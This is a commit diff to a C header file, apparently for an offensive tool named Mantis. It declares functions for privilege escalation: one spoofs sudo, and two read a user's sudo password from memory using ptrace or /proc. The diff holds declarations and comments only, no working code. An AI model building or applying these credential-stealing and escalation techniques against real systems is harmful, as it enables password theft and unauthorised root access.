9e4acb31f5772ae8af57d71abf49d2c21e3d3b63
Roan Rothrock <roan.rothrock@proton.me>
2024-06-28 08:49:43 -0500

    Update techniques.h

--- src/techniques.h
+++ src/techniques.h
@@ -18,17 +18,28 @@
 // because this points to the process itself, as opposed to another
 // process, which would be the case if we send something like SIGKILL.
 // As for the function itself, it won't return on success; it'll kill
-// itself instead. Therefore, this function will always return 0. Also
-// note, this function will just run... in saecula saeculorum
+// itself on success. Also note, this function will just run... in
+// saecula saeculorum. 
 // `program`: the program (Mantis) to execute as root.
-int sudo_spoof(const char *program);
+void sudo_spoof(const char *program);
 
 
 // As for the second techinque...
 // I'm not writing this down right now
 // TODO
-int stack_logger_ptrace(void);
-int stack_logger_wo_ptrace(void);
+
+// This technique also utilizes Sudo, but instead of 'spoofing' the
+// process, it will read the password from memory, with, of course, the
+// intention of utilizing the password to escalate priviledges. Now,
+// there are multiple ways to do this, one utilizing ptrace and another
+// workaround method using the `proc/` directory.
+// The nature of these functions is the same as `sudo_spoof`, that is,
+// that they will run indefinitely and start another process and kill
+// itself. It doesn't have to be this way, but I wanted to make the
+// interface identical to that of the other function.
+// `program`: the program (Mantis) to execute as root.
+void stack_logger_ptrace(const char *program);
+void stack_logger_wo_ptrace(const char *program);
 
 // Still considering whether I want to try a zero day... Probably not,
 // but hey, maybe.
